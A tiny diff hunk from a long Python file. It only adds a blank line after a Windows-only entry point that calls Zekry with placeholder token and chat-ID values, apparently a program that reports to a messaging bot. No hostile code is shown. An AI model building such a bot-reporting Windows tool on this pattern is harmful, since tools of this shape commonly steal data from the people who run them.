@@ -989,3 +989,4 @@ class Debug:
 
 if __name__ == '__main__' and os.name == "nt":
     Zekry(__TOKEN__, __CHAT_ID__)
+
